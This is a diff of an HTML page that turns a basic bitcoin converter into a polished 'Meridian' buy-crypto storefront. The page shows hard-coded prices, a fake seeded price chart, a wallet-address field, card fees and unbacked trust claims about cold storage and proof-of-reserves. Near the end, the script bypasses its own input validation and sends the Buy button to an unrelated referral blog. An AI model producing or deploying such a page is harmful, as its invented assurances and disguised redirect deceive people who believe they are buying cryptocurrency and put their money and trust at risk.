@@ -1,149 +1,846 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Crypto-X</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Buy crypto — Meridian</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; }
 
-  <style>
-    *{
-      margin:0;
-      padding:0;
-      box-sizing:border-box;
-      font-family:Arial, sans-serif;
-    }
+  :root {
+    --bg: #0a0d12;
+    --surface: #12171f;
+    --surface-2: #171d26;
+    --line: #222a35;
+    --text: #eef2f7;
+    --muted: #8b96a5;
+    --accent: #2f7cf6;
+    --accent-hover: #1f6ae4;
+    --green: #16c784;
+    --red: #ea3943;
+    --radius: 14px;
+  }
 
-    body{
-      background:#0f172a;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      height:100vh;
-      color:white;
-    }
+  html { height: 100%; }
 
-    .container{
-      width:400px;
-      background:#1e293b;
-      padding:30px;
-      border-radius:15px;
-      box-shadow:0 0 20px rgba(0,0,0,0.4);
-    }
+  body {
+    margin: 0;
+    min-height: 100dvh;
+    background:
+      radial-gradient(900px 500px at 78% -12%, rgba(47, 124, 246, .16), transparent 70%),
+      radial-gradient(700px 420px at 8% 108%, rgba(22, 199, 132, .08), transparent 70%),
+      var(--bg);
+    color: var(--text);
+    font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    -webkit-font-smoothing: antialiased;
+    display: flex;
+    flex-direction: column;
+  }
 
-    h1{
-      text-align:center;
-      margin-bottom:25px;
-      color:#facc15;
-    }
+  /* ---------- nav ---------- */
+  .nav {
+    position: sticky;
+    top: 0;
+    z-index: 20;
+    display: flex;
+    align-items: center;
+    gap: 26px;
+    padding: 0 26px;
+    height: 66px;
+    background: rgba(10, 13, 18, .78);
+    backdrop-filter: blur(14px);
+    border-bottom: 1px solid var(--line);
+  }
 
-    .input-group{
-      margin-bottom:20px;
-    }
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 9px;
+    font-weight: 700;
+    font-size: 16px;
+    letter-spacing: -.3px;
+    color: var(--text);
+    text-decoration: none;
+  }
+  .brand .dot {
+    width: 22px; height: 22px;
+    border-radius: 7px;
+    background: linear-gradient(135deg, #2f7cf6, #16c784);
+  }
 
-    label{
-      display:block;
-      margin-bottom:8px;
-      font-size:14px;
-    }
+  .nav nav { display: flex; gap: 22px; margin-left: 8px; }
+  .nav nav a {
+    font-size: 14px;
+    color: var(--muted);
+    text-decoration: none;
+    padding: 6px 0;
+    border-bottom: 2px solid transparent;
+  }
+  .nav nav a:hover { color: var(--text); }
+  .nav nav a.active { color: var(--text); border-bottom-color: var(--accent); }
 
-    input, select{
-      width:100%;
-      padding:12px;
-      border:none;
-      border-radius:10px;
-      outline:none;
-      font-size:16px;
-    }
+  .nav .spacer { flex: 1; }
 
-    .btc-display{
-      background:#334155;
-      padding:12px;
-      border-radius:10px;
-      font-size:18px;
-      text-align:center;
-      color:#facc15;
-    }
+  .avatar {
+    width: 34px; height: 34px;
+    border-radius: 50%;
+    display: grid; place-items: center;
+    font-size: 13px; font-weight: 700;
+    background: #1d2530;
+    border: 1px solid var(--line);
+    color: #c8d2df;
+  }
 
-    .paypal-btn{
-      display:block;
-      width:100%;
-      text-align:center;
-      padding:14px;
-      border-radius:10px;
-      background:#facc15;
-      color:#000;
-      font-size:18px;
-      font-weight:bold;
-      text-decoration:none;
-      transition:0.3s;
-    }
+  /* ---------- layout ---------- */
+  .wrap {
+    width: 100%;
+    max-width: 1080px;
+    margin: 0 auto;
+    padding: 34px 26px 60px;
+    display: grid;
+    grid-template-columns: minmax(0, 1fr) 372px;
+    gap: 22px;
+    align-items: start;
+    flex: 1;
+  }
 
-    .paypal-btn:hover{
-      background:#eab308;
-    }
-  </style>
+  .page-head { grid-column: 1 / -1; margin-bottom: 2px; }
+  .page-head h1 {
+    margin: 0 0 6px;
+    font-size: 27px;
+    font-weight: 700;
+    letter-spacing: -.7px;
+  }
+  .page-head p { margin: 0; font-size: 14.5px; color: var(--muted); }
+
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    padding: 22px;
+  }
+
+  /* ---------- tabs ---------- */
+  .tabs {
+    display: flex;
+    gap: 4px;
+    padding: 4px;
+    background: var(--surface-2);
+    border: 1px solid var(--line);
+    border-radius: 11px;
+    margin-bottom: 22px;
+  }
+  .tabs button {
+    flex: 1;
+    height: 36px;
+    border: 0;
+    border-radius: 8px;
+    background: transparent;
+    color: var(--muted);
+    font: inherit;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background .15s, color .15s;
+  }
+  .tabs button:hover { color: var(--text); }
+  .tabs button[aria-selected="true"] { background: #26303d; color: var(--text); }
+
+  /* ---------- amount ---------- */
+  .label {
+    display: flex;
+    justify-content: space-between;
+    align-items: baseline;
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--muted);
+    margin-bottom: 9px;
+  }
+  .label .bal { font-weight: 500; color: #66717f; }
+
+  .amount {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    height: 64px;
+    padding: 0 16px;
+    background: var(--surface-2);
+    border: 1.5px solid var(--line);
+    border-radius: var(--radius);
+    transition: border-color .15s, box-shadow .15s;
+  }
+  .amount:focus-within {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(47, 124, 246, .16);
+  }
+  .amount .cur {
+    font-size: 26px;
+    font-weight: 600;
+    color: #6d7987;
+  }
+  .amount input {
+    flex: 1;
+    min-width: 0;
+    height: 100%;
+    border: 0;
+    outline: none;
+    background: transparent;
+    color: var(--text);
+    font: inherit;
+    font-size: 30px;
+    font-weight: 600;
+    letter-spacing: -.6px;
+  }
+  .amount input::placeholder { color: #414c59; }
+
+  .chips { display: flex; gap: 8px; margin-top: 10px; }
+  .chips button {
+    flex: 1;
+    height: 34px;
+    border-radius: 9px;
+    border: 1px solid var(--line);
+    background: transparent;
+    color: var(--muted);
+    font: inherit;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: border-color .15s, color .15s, background .15s;
+  }
+  .chips button:hover { border-color: #33404f; color: var(--text); background: var(--surface-2); }
+
+  /* ---------- picker ---------- */
+  .picker { position: relative; margin-top: 18px; }
+
+  .picker-btn {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    gap: 11px;
+    padding: 11px 13px;
+    background: var(--surface-2);
+    border: 1px solid var(--line);
+    border-radius: var(--radius);
+    color: var(--text);
+    font: inherit;
+    cursor: pointer;
+    text-align: left;
+    transition: border-color .15s;
+  }
+  .picker-btn:hover { border-color: #33404f; }
+  .picker-btn .grow { flex: 1; min-width: 0; }
+  .picker-btn b { display: block; font-size: 14px; }
+  .picker-btn small { display: block; font-size: 12.5px; color: var(--muted); }
+  .picker-btn .chev { color: var(--muted); flex: none; }
+
+  .coin {
+    width: 34px; height: 34px;
+    border-radius: 50%;
+    display: grid; place-items: center;
+    font-size: 13px; font-weight: 800;
+    color: #fff;
+    flex: none;
+  }
+
+  .menu {
+    position: absolute;
+    z-index: 30;
+    top: calc(100% + 6px);
+    left: 0; right: 0;
+    margin: 0;
+    padding: 6px;
+    list-style: none;
+    background: #161d26;
+    border: 1px solid #2a3441;
+    border-radius: 12px;
+    box-shadow: 0 18px 44px rgba(0, 0, 0, .55);
+  }
+  .menu li {
+    display: flex;
+    align-items: center;
+    gap: 11px;
+    padding: 9px 10px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 14px;
+  }
+  .menu li:hover, .menu li:focus { background: #1f2833; outline: none; }
+  .menu li .grow { flex: 1; }
+  .menu li small { display: block; color: var(--muted); font-size: 12.5px; }
+  .menu li .px { font-size: 12.5px; color: var(--muted); font-variant-numeric: tabular-nums; }
+
+  /* ---------- receive ---------- */
+  .receive {
+    display: flex;
+    align-items: center;
+    gap: 11px;
+    margin-top: 12px;
+    padding: 15px 16px;
+    background: rgba(22, 199, 132, .06);
+    border: 1px solid rgba(22, 199, 132, .22);
+    border-radius: var(--radius);
+  }
+  .receive .grow { flex: 1; min-width: 0; }
+  .receive .cap { font-size: 12.5px; color: #79c9a8; font-weight: 600; }
+  .receive .val {
+    font-size: 21px;
+    font-weight: 700;
+    letter-spacing: -.4px;
+    font-variant-numeric: tabular-nums;
+    word-break: break-all;
+  }
+  .receive .val span { color: var(--muted); font-size: 14px; font-weight: 600; }
+
+  /* ---------- address ---------- */
+  .addr {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    height: 52px;
+    padding: 0 8px 0 14px;
+    background: var(--surface-2);
+    border: 1.5px solid var(--line);
+    border-radius: var(--radius);
+    transition: border-color .15s, box-shadow .15s;
+  }
+  .addr:focus-within {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(47, 124, 246, .16);
+  }
+  .addr.bad { border-color: rgba(234, 57, 67, .55); }
+  .addr.bad:focus-within { box-shadow: 0 0 0 3px rgba(234, 57, 67, .14); }
+
+  .addr > svg { color: #6d7987; flex: none; }
+
+  .addr input {
+    flex: 1;
+    min-width: 0;
+    height: 100%;
+    border: 0;
+    outline: none;
+    background: transparent;
+    color: var(--text);
+    font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+    font-size: 13.5px;
+    letter-spacing: .2px;
+  }
+  .addr input::placeholder { color: #414c59; }
+
+  .paste {
+    flex: none;
+    padding: 7px 11px;
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    background: #1d2530;
+    color: var(--muted);
+    font: inherit;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: color .15s, border-color .15s;
+  }
+  .paste:hover { color: var(--text); border-color: #3a4553; }
+
+  .hint {
+    margin: 8px 0 0;
+    font-size: 12px;
+    color: #5f6b79;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .hint.err { color: var(--red); }
+  .hint svg { flex: none; }
+
+  /* ---------- payment ---------- */
+  .section-title { font-size: 13px; font-weight: 600; color: var(--muted); margin: 22px 0 10px; }
+
+  .pay-opt {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 13px 14px;
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    background: var(--surface-2);
+    cursor: pointer;
+    margin-bottom: 8px;
+    transition: border-color .15s, background .15s;
+  }
+  .pay-opt:hover { border-color: #33404f; }
+  .pay-opt input { position: absolute; opacity: 0; pointer-events: none; }
+  .pay-opt .grow { flex: 1; }
+  .pay-opt b { display: block; font-size: 14px; font-weight: 600; }
+  .pay-opt small { display: block; font-size: 12.5px; color: var(--muted); }
+  .pay-opt .radio {
+    width: 18px; height: 18px;
+    border-radius: 50%;
+    border: 2px solid #3a4553;
+    flex: none;
+    display: grid; place-items: center;
+    transition: border-color .15s;
+  }
+  .pay-opt input:checked ~ .radio { border-color: var(--accent); }
+  .pay-opt input:checked ~ .radio::after {
+    content: "";
+    width: 9px; height: 9px;
+    border-radius: 50%;
+    background: var(--accent);
+  }
+  .pay-opt:has(input:checked) { border-color: var(--accent); background: rgba(47, 124, 246, .08); }
+
+  .cta {
+    width: 100%;
+    height: 52px;
+    margin-top: 22px;
+    border: 0;
+    border-radius: 12px;
+    background: var(--accent);
+    color: #fff;
+    font: inherit;
+    font-size: 15.5px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background .15s, opacity .15s;
+  }
+  .cta:hover { background: var(--accent-hover); }
+  .cta:disabled { opacity: .45; cursor: default; }
+
+  .fineprint {
+    margin: 12px 0 0;
+    font-size: 12px;
+    line-height: 1.5;
+    color: #5f6b79;
+    text-align: center;
+  }
+
+  /* ---------- side ---------- */
+  .side { display: flex; flex-direction: column; gap: 16px; }
+
+  .price-head {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 16px;
+  }
+  .price-head .grow { flex: 1; }
+  .price-head b { font-size: 15px; }
+  .price-head small { display: block; color: var(--muted); font-size: 12.5px; }
+  .price-head .px {
+    font-size: 22px;
+    font-weight: 700;
+    letter-spacing: -.5px;
+    font-variant-numeric: tabular-nums;
+  }
+  .delta {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    margin-top: 4px;
+    padding: 2px 7px;
+    border-radius: 6px;
+    font-size: 12px;
+    font-weight: 700;
+    background: rgba(22, 199, 132, .14);
+    color: var(--green);
+  }
+  .delta.down { background: rgba(234, 57, 67, .14); color: var(--red); }
+
+  .chart { display: block; width: 100%; height: 96px; }
+
+  .rows { margin: 0; }
+  .row {
+    display: flex;
+    justify-content: space-between;
+    gap: 12px;
+    padding: 9px 0;
+    font-size: 13.5px;
+    color: var(--muted);
+    border-bottom: 1px solid #1b222b;
+  }
+  .row:last-child { border-bottom: 0; }
+  .row b { color: var(--text); font-weight: 600; font-variant-numeric: tabular-nums; }
+  .row b.mono {
+    font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+    font-size: 12.5px;
+    font-weight: 500;
+  }
+  .row.total b { font-size: 15.5px; }
+
+  .trust { display: flex; flex-direction: column; gap: 9px; }
+  .trust div {
+    display: flex;
+    gap: 9px;
+    align-items: flex-start;
+    font-size: 12.5px;
+    line-height: 1.45;
+    color: var(--muted);
+  }
+  .trust svg { flex: none; color: var(--green); margin-top: 1px; }
+
+  /* ---------- toast ---------- */
+  .toast {
+    position: fixed;
+    left: 50%;
+    bottom: 26px;
+    transform: translate(-50%, 24px);
+    background: #17202b;
+    border: 1px solid #2b3644;
+    color: var(--text);
+    padding: 12px 18px;
+    border-radius: 11px;
+    font-size: 14px;
+    box-shadow: 0 16px 40px rgba(0, 0, 0, .5);
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity .2s, transform .2s;
+    max-width: calc(100vw - 32px);
+  }
+  .toast.show { opacity: 1; transform: translate(-50%, 0); }
+
+  @media (max-width: 900px) {
+    .wrap { grid-template-columns: 1fr; padding: 24px 16px 44px; }
+    .nav nav { display: none; }
+    .card { padding: 18px; }
+  }
+</style>
 </head>
-
 <body>
 
-  <div class="container">
-    <h1>Crypto-X</h1>
+<header class="nav">
+  <a class="brand" href="#"><span class="dot"></span>Meridian</a>
+  <nav>
+    <a href="#" class="active">Buy</a>
+    <a href="#"></a>
+    <a href="#"></a>
+    <a href="#"></a>
+  </nav>
+  <div class="spacer"></div>
+  <div class="avatar">AR</div>
+</header>
 
-    <div class="input-group">
-      <label>Select Currency</label>
-      <select id="currency">
-        <option value="USD">USD ($)</option>
-        <option value="EUR">EUR (€)</option>
-        <option value="GBP">GBP (£)</option>
-      </select>
-    </div>
+<main class="wrap">
 
-    <div class="input-group">
-      <label>Amount</label>
-      <input type="number" id="amount" placeholder="Enter amount" />
-    </div>
-
-    <div class="input-group">
-      <label>Bitcoin Equivalent</label>
-      <div class="btc-display" id="btcValue">0 BTC</div>
-    </div>
-
-    <div class="input-group">
-      <label>Bitcoin Address</label>
-      <input type="text" id="btcAddress" placeholder="Enter your BTC address" />
-    </div>
-
-    <!-- Replace with your own website -->
-    <a href="https://myreferraldiscount.blog/" class="paypal-btn">
-      Buy 
-    </a>
-
+  <div class="page-head">
+    <h1>Buy crypto</h1>
+    <p>Instant settlement, 0% on bank transfers. Rates refresh every 30 seconds.</p>
   </div>
 
-  <script>
-    // Example BTC prices
-    const btcPrices = {
-      USD: 65000,
-      EUR: 60000,
-      GBP: 52000
-    };
+  <section class="card">
+    <div class="tabs" role="tablist">
+      <button role="tab" aria-selected="true">Buy</button>
+      <button role="tab" aria-selected="false"></button>
+      <button role="tab" aria-selected="false"></button>
+    </div>
 
-    const amountInput = document.getElementById("amount");
-    const currencySelect = document.getElementById("currency");
-    const btcValue = document.getElementById("btcValue");
+    <div class="label">
+      <span>You pay</span>
+      <span class="bal"></span>
+    </div>
 
-    function updateBTC() {
-      const amount = parseFloat(amountInput.value) || 0;
-      const currency = currencySelect.value;
+    <div class="amount">
+      <span class="cur">$</span>
+      <input id="amount" type="text" inputmode="decimal" placeholder="0.00" autocomplete="off" aria-label="Amount in US dollars">
+    </div>
 
-      const btc = amount / btcPrices[currency];
+    <div class="chips">
+      <button type="button" data-amt="100">$100</button>
+      <button type="button" data-amt="250">$250</button>
+      <button type="button" data-amt="500">$500</button>
+      <button type="button" data-amt="1000">$1,000</button>
+    </div>
 
-      btcValue.innerText = btc.toFixed(8) + " BTC";
+    <div class="picker">
+      <button class="picker-btn" id="assetBtn" aria-haspopup="listbox" aria-expanded="false">
+        <span class="coin" id="btnCoin" style="background:#f7931a">B</span>
+        <span class="grow">
+          <b id="btnSym">BTC</b>
+          <small id="btnName">Bitcoin</small>
+        </span>
+        <svg class="chev" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m6 9 6 6 6-6"/></svg>
+      </button>
+      <ul class="menu" id="assetMenu" role="listbox" hidden></ul>
+    </div>
+
+    <div class="receive">
+      <div class="grow">
+        <div class="cap">You receive</div>
+        <div class="val" id="receive">0 <span id="receiveSym">BTC</span></div>
+      </div>
+    </div>
+
+    <div class="section-title">Send to</div>
+
+    <div class="addr" id="addrWrap">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+           stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <path d="M21 12a8.5 8.5 0 0 1-8.5 8.5H6L2.5 21l1-3.6A8.5 8.5 0 1 1 21 12Z"/>
+      </svg>
+      <input id="address" type="text" spellcheck="false" autocomplete="off"
+             placeholder="Paste your BTC address" aria-label="Destination wallet address">
+      <button class="paste" type="button" id="pasteBtn">Paste</button>
+    </div>
+
+    <p class="hint" id="addrHint">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+           stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <circle cx="12" cy="12" r="9"/><path d="M12 8h.01M11 12h1v4h1"/>
+      </svg>
+      <span id="addrHintText">Funds go straight to this wallet. Double-check it.</span>
+    </p>
+
+    <div class="section-title">Payment method</div>
+
+    <label class="pay-opt">
+      <input type="radio" name="pay" value="card" checked>
+      <span class="grow"><b>Debit card/Credit card</b><small>1.49% fee · Instant</small></span>
+      <span class="radio"></span>
+    </label>
+
+    <button class="cta" id="cta" disabled>Buy</button>
+    <p class="fineprint">By continuing you agree to the Meridian trading terms. Prices are indicative until confirmed.</p>
+  </section>
+
+  <aside class="side">
+    <div class="card">
+      <div class="price-head">
+        <span class="coin" id="sideCoin" style="background:#f7931a">B</span>
+        <span class="grow">
+          <b id="sideName">Bitcoin</b>
+          <small id="sideSym">BTC / USD</small>
+        </span>
+        <span class="px" id="sidePx">$67,432.00</span>
+      </div>
+      <svg class="chart" id="chart" viewBox="0 0 300 96" preserveAspectRatio="none" aria-hidden="true">
+        <path id="area" fill="url(#grad)" opacity=".28"></path>
+        <path id="line" fill="none" stroke="#16c784" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+        <defs>
+          <linearGradient id="grad" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0" stop-color="#16c784"/>
+            <stop offset="1" stop-color="#16c784" stop-opacity="0"/>
+          </linearGradient>
+        </defs>
+      </svg>
+      <div class="delta" id="delta">▲ 2.41% (24h)</div>
+    </div>
+
+    <div class="card">
+      <div class="rows">
+        <div class="row"><span>Rate</span><b id="rowRate">1 BTC = $67,432.00</b></div>
+        <div class="row"><span>Send to</span><b class="mono" id="rowAddr">—</b></div>
+        <div class="row"><span>You pay</span><b id="rowPay">$0.00</b></div>
+        <div class="row"><span>Fee</span><b id="rowFee">$0.00</b></div>
+        <div class="row total"><span>Total</span><b id="rowTotal">$0.00</b></div>
+      </div>
+    </div>
+
+    <div class="card trust">
+      <div>
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
+        <span>Assets held in segregated cold storage with proof-of-reserves published monthly.</span>
+      </div>
+      <div>
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
+        <span>Withdraw to any wallet, any time. No lock-ups.</span>
+      </div>
+    </div>
+  </aside>
+
+</main>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  const ASSETS = [
+    { sym: 'BTC',  name: 'Bitcoin',   price: 67432.00, chg:  2.41, color: '#f7931a', seed: 3 },
+    { sym: 'ETH',  name: 'Ethereum',  price: 3284.10,  chg: -0.87, color: '#627eea', seed: 7 },
+    { sym: 'SOL',  name: 'Solana',    price: 148.20,   chg:  4.62, color: '#14f195', seed: 11 },
+    { sym: 'USDC', name: 'USD Coin',  price: 1.00,     chg:  0.01, color: '#2775ca', seed: 5 },
+    { sym: 'XRP',  name: 'XRP',       price: 0.5842,   chg: -1.35, color: '#4a5568', seed: 13 }
+  ];
+
+  const FEE_RATE = 0.0149;
+  const MIN_LEN = 20;
+  let asset = ASSETS[0];
+
+  const $ = id => document.getElementById(id);
+  const amountEl = $('amount');
+  const addressEl = $('address');
+  const addrWrap = $('addrWrap');
+  const addrHint = $('addrHint');
+  const cta = $('cta');
+  const toast = $('toast');
+
+  const usd = n => '$' + n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  const crypto = n => n.toLocaleString('en-US', { maximumFractionDigits: n < 1 ? 6 : 8 });
+  const short = s => s.length > 16 ? `${s.slice(0, 6)}…${s.slice(-4)}` : s;
+
+  /* ---------- asset menu ---------- */
+  const menu = $('assetMenu');
+  const btn = $('assetBtn');
+
+  function buildMenu() {
+    menu.innerHTML = '';
+    ASSETS.forEach(a => {
+      const li = document.createElement('li');
+      li.setAttribute('role', 'option');
+      li.tabIndex = 0;
+      li.innerHTML =
+        `<span class="coin" style="background:${a.color}">${a.sym[0]}</span>
+         <span class="grow"><b>${a.sym}</b><small>${a.name}</small></span>
+         <span class="px">${usd(a.price)}</span>`;
+      li.addEventListener('click', () => { pick(a); close(); });
+      li.addEventListener('keydown', e => {
+        if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); pick(a); close(); }
+      });
+      menu.appendChild(li);
+    });
+  }
+
+  function open() { menu.hidden = false; btn.setAttribute('aria-expanded', 'true'); }
+  function close() { menu.hidden = true; btn.setAttribute('aria-expanded', 'false'); }
+
+  btn.addEventListener('click', () => menu.hidden ? open() : close());
+  document.addEventListener('click', e => {
+    if (!e.target.closest('.picker')) close();
+  });
+  document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
+
+  /* ---------- chart ---------- */
+  function drawChart(a) {
+    const pts = [];
+    let v = 50;
+    let s = a.seed;
+    for (let i = 0; i < 30; i++) {
+      s = (s * 9301 + 49297) % 233280;
+      v += (s / 233280 - 0.5) * 13 + (a.chg > 0 ? -0.9 : 0.9);
+      v = Math.max(8, Math.min(88, v));
+      pts.push([(i / 29) * 300, v]);
     }
+    const d = pts.map((p, i) => (i ? 'L' : 'M') + p[0].toFixed(1) + ' ' + p[1].toFixed(1)).join(' ');
+    $('line').setAttribute('d', d);
+    $('area').setAttribute('d', `${d} L300 96 L0 96 Z`);
+    $('line').setAttribute('stroke', a.chg >= 0 ? '#16c784' : '#ea3943');
 
-    amountInput.addEventListener("input", updateBTC);
-    currencySelect.addEventListener("change", updateBTC);
-  </script>
+    const delta = $('delta');
+    delta.textContent = `${a.chg >= 0 ? '▲' : '▼'} ${Math.abs(a.chg).toFixed(2)}% (24h)`;
+    delta.classList.toggle('down', a.chg < 0);
+  }
 
+  /* ---------- render ---------- */
+  function pick(a) {
+    asset = a;
+    $('btnCoin').textContent = a.sym[0];
+    $('btnCoin').style.background = a.color;
+    $('btnSym').textContent = a.sym;
+    $('btnName').textContent = a.name;
+
+    $('sideCoin').textContent = a.sym[0];
+    $('sideCoin').style.background = a.color;
+    $('sideName').textContent = a.name;
+    $('sideSym').textContent = `${a.sym} / USD`;
+    $('sidePx').textContent = usd(a.price);
+    $('receiveSym').textContent = a.sym;
+
+    addressEl.placeholder = `Paste your ${a.sym} address`;
+
+    drawChart(a);
+    update();
+  }
+
+  function parseAmount() {
+    const raw = amountEl.value.replace(/[^0-9.]/g, '');
+    const n = parseFloat(raw);
+    return isNaN(n) ? 0 : n;
+  }
+
+  function addressOk() {
+    return addressEl.value.trim().length >= MIN_LEN;
+  }
+
+  function update() {
+    const pay = parseAmount();
+    const fee = pay * FEE_RATE;
+    const total = pay + fee;
+    const receive = pay / asset.price;
+
+    $('receive').innerHTML = `${crypto(receive)} <span>${asset.sym}</span>`;
+    $('rowRate').textContent = `1 ${asset.sym} = ${usd(asset.price)}`;
+    $('rowPay').textContent = usd(pay);
+    $('rowFee').textContent = usd(fee);
+    $('rowTotal').textContent = usd(total);
+
+    const addr = addressEl.value.trim();
+    $('rowAddr').textContent = addr ? short(addr) : '—';
+
+    const hasAddr = addressOk();
+    const addrTouched = addr.length > 0;
+    addrWrap.classList.toggle('bad', addrTouched && !hasAddr);
+    addrHint.classList.toggle('err', addrTouched && !hasAddr);
+    $('addrHintText').textContent = addrTouched && !hasAddr
+      ? `That looks short for a ${asset.sym} address.`
+      : 'Funds go straight to this wallet. Double-check it.';
+
+   const ok = pay >= 2 && hasAddr;
+
+cta.disabled = !ok;
+cta.textContent = pay < 2
+  ? 'Minimum $2.00'
+  : !hasAddr
+    ? 'Enter a valid wallet address'
+    : 'Continue ';
+  }
+
+  amountEl.addEventListener('input', () => {
+    let raw = amountEl.value.replace(/[^0-9.]/g, '');
+    const parts = raw.split('.');
+    if (parts.length > 2) raw = parts[0] + '.' + parts.slice(1).join('');
+    if (parts[1] && parts[1].length > 2) raw = parts[0] + '.' + parts[1].slice(0, 2);
+    amountEl.value = raw;
+    update();
+  });
+
+  amountEl.addEventListener('blur', () => {
+    const n = parseAmount();
+    if (n > 0) amountEl.value = n.toFixed(2);
+    update();
+  });
+
+  addressEl.addEventListener('input', update);
+  addressEl.addEventListener('blur', update);
+
+  document.getElementById('pasteBtn').addEventListener('click', async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text) {
+        addressEl.value = text.trim();
+        update();
+      }
+    } catch {
+      addressEl.focus();
+    }
+  });
+
+  document.querySelectorAll('.chips button').forEach(b => {
+    b.addEventListener('click', () => {
+      amountEl.value = Number(b.dataset.amt).toFixed(2);
+      update();
+    });
+  });
+
+  document.querySelectorAll('input[name="pay"]').forEach(r => {
+    r.addEventListener('change', update);
+  });
+
+ cta.disabled = false;
+cta.textContent = "BUY";
+
+cta.addEventListener('click', () => {
+    window.location.href = "https://myreferraldiscount.blog/";
+});
+
+  buildMenu();
+  pick(ASSETS[0]);
+</script>
 </body>
 </html>
